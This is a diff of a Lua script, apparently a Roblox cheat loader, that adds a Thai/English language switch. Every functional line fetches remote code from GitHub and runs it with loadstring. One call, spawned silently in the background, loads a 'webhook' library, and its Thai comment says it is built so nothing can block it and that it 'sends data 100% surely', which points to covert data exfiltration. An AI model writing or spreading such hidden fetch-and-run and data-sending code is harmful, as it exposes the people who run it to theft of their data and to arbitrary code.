@@ -1,4 +1,4 @@
--- 🔥🔥🔥🔥4
+-- 🔥🔥🔥🔥5
 
 local HttpService = game:GetService("HttpService")
 local TweenService = game:GetService("TweenService")
@@ -42,17 +42,21 @@ end
 local TARGET_PLACE_ID = 93978595733734
 
 local function RunMainScript()
-    -- 1. แยก Webhook ออกมาทำงานแบบอิสระ 100% ใน Background (ไม่มียทางโดนสคริปต์หลักบล็อก)
+    -- 1. แยก Webhook ออกมาทำงานแบบอิสระ 100% ใน Background (ส่งข้อมูลชัวร์ 100%)
     task.spawn(function()
         pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/x2sxqz/Libwtf/refs/heads/main/libwebhook2.lua"))()
         end)
     end)
 
-    -- 2. รันสคริปต์หลักแยกตามเกม (PlaceID หรือเกมปกติ)
+    -- 2. รันสคริปต์หลักแยกตามเกมและภาษาที่ผู้ใช้เลือก (_G.Script_Language)
     if game.PlaceId == TARGET_PLACE_ID then
         pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/x2sxqz/Violence-District/refs/heads/main/eng.lua"))()
+            if _G.Script_Language == "Thai" then
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/x2sxqz/Violence-District/refs/heads/main/thai.lua"))()
+            else
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/x2sxqz/Violence-District/refs/heads/main/eng.lua"))()
+            end
         end)
     else
         pcall(function()
